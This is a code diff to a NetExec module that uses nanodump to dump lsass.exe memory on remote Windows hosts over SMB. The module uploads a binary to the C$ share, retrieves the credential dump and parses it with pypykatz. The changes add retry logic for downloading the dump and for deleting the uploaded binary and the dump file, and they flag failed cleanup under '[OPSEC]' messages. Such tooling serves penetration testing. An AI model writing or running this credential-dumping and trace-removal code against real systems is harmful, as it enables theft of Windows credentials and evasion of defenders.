@@ -3,7 +3,6 @@
 # nanodump: https://github.com/helpsystems/nanodump
 
 import os
-import base64
 import sys
 import random
 from pypykatz.pypykatz import pypykatz
@@ -39,12 +38,12 @@ class NXCModule:
         module_dir = os.path.dirname(os.path.abspath(__file__))
         # Go up one level to nxc directory, then into data
         blob_path = os.path.join(os.path.dirname(module_dir), "data", filename)
-        
+
         try:
             with open(blob_path, "rb") as f:
                 return f.read()
-        except FileNotFoundError:
-            raise FileNotFoundError(f"Could not find blob file: {blob_path}")
+        except FileNotFoundError as e:
+            raise FileNotFoundError(f"Could not find blob file: {blob_path}") from e
 
     def _generate_plausible_name(self):
         """Generate a plausible service name with timestamp."""
@@ -61,7 +60,7 @@ class NXCModule:
         """
         # Use a more standard path that works with SMB shares
         self.remote_tmp_dir = "C:\\Users\\Public\\Documents\\"
-        self.share = "C$" 
+        self.share = "C$"
         self.tmp_share = "Users\\Public\\Documents\\"
         self.nano_embedded64 = self._load_blob_file("x64.blob")
         self.nano_embedded32 = self._load_blob_file("x32.blob")
@@ -124,7 +123,7 @@ class NXCModule:
                         else:
                             self.context.log.fail(f"File upload failed - file does not exist: {e}")
                             return
-                    except Exception as list_error:
+                    except Exception:
                         self.context.log.fail(f"Cannot verify file upload and cannot list directory: {e}")
                         return
         else:
@@ -184,24 +183,55 @@ class NXCModule:
             self.context.log.display(f"Copying {nano_log_name} to host")
             filename = os.path.join(self.dir_result, f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
             if self.context.protocol == "smb":
-                with open(filename, "wb+") as dump_file:
+                # Retry file download with multiple attempts
+                download_success = False
+                max_retries = 3
+                for attempt in range(max_retries):
                     try:
-                        self.connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
+                        with open(filename, "wb+") as dump_file:
+                            self.connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
                         self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
+                        download_success = True
+                        break
                     except Exception as e:
-                        self.context.log.fail(f"Error while getting file: {e}")
+                        if attempt < max_retries - 1:
+                            self.context.log.display(f"Download attempt {attempt + 1} failed, retrying in 5 seconds: {e}")
+                            import time
+                            time.sleep(5)
+                        else:
+                            self.context.log.fail(f"Error while getting file after {max_retries} attempts: {e}")
 
-                try:
-                    self.connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
-                    self.context.log.success(f"Deleted nano file on the {self.share} share")
-                except Exception as e:
-                    self.context.log.fail(f"Error deleting nano file on share {self.share}: {e}")
+                if not download_success:
+                    self.delete_nanodump_binary()
+                    return
 
-                try:
-                    self.connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
-                    self.context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
-                except Exception as e:
-                    self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
+                # Retry file deletions with delay for sharing violations
+                import time
+                time.sleep(2)  # Brief delay before cleanup to allow file handle closure
+
+                for attempt in range(3):
+                    try:
+                        self.connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
+                        self.context.log.success(f"Deleted nano file on the {self.share} share")
+                        break
+                    except Exception as e:
+                        if attempt < 2:
+                            self.context.log.display(f"Delete attempt {attempt + 1} for nano file failed, retrying in 3 seconds: {e}")
+                            time.sleep(3)
+                        else:
+                            self.context.log.fail(f"[OPSEC] Error deleting nano file on share {self.share} after 3 attempts: {e}")
+
+                for attempt in range(3):
+                    try:
+                        self.connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
+                        self.context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
+                        break
+                    except Exception as e:
+                        if attempt < 2:
+                            self.context.log.display(f"Delete attempt {attempt + 1} for dump file failed, retrying in 3 seconds: {e}")
+                            time.sleep(3)
+                        else:
+                            self.context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on share {self.share} after 3 attempts: {e}")
             else:
                 try:
                     exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
